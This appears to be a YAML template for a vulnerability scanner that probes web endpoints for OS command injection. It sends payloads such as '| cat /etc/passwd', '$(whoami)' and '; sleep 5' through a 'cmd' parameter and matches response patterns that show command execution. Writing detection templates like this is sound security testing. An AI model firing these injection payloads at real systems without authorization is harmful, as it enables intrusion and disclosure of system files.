id: generic-command-injection
info:
  name: Command Injection
  description: Detects OS command injection in discovered endpoints
  owasp_category: A03:2025
  severity: critical
  tags:
    - command
    - rce
    - injection
    - generic

generic:
  endpoint: "{{all_discovered}}"
  method: GET
  parameter: "cmd"

  payloads:
    - "; ls -la"
    - "| cat /etc/passwd"
    - "& whoami"
    - "`id`"
    - "$(whoami)"
    - "' && ping -c 1 localhost && echo '"
    - "; sleep 5"

  matchers:
    - type: status
      condition: in
      status:
        - 200
    - type: regex
      condition: or
      regex:
        - 'root:x:[0-9]+:[0-9]+:'
        - 'uid=[0-9]+\(\w+\)'
        - 'gid=[0-9]+\(\w+\)'
        - 'total [0-9]+'
        - 'drwx'
        - '-rw-'
        - 'PING.*bytes of data'
        - '[0-9]+ packets transmitted'
        - '/bin/bash'
        - 'sh-[0-9.]+'

  matchers_condition: and
